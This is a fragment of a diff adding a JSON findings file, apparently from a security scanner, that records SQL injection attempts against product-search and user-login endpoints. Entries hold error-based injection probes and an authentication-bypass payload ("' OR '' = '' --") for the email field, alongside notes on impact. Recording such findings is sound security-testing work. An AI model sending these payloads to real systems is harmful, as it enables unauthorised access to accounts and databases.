+        "payload": " OR 'a'='d"
+      },
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
+        "payload": " OR 'a'='e"
+      },
+      {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "parameter": "q",
+        "endpoint_type": "search",
+        "technique": "error_based_sqli",
+        "payload": " OR 'a'='g"
+      },
+      {
+        "method": "POST",
+        "path": "/rest/user/login",
+        "parameter": "email",
+        "endpoint_type": "auth_login",
+        "technique": "authentication_bypass",
+        "payload": "' OR '' = '' --"
+      }
+    ],
+    "potential_impacts": [
+      "authentication logic can be bypassed for the affected endpoint",
+      "database query structure is influenced by user input"
+    ],
+    "unverified_capabilities": [
+      "non-sensitive in-band read confirmation was not proven"
+    ]
+  }
+}
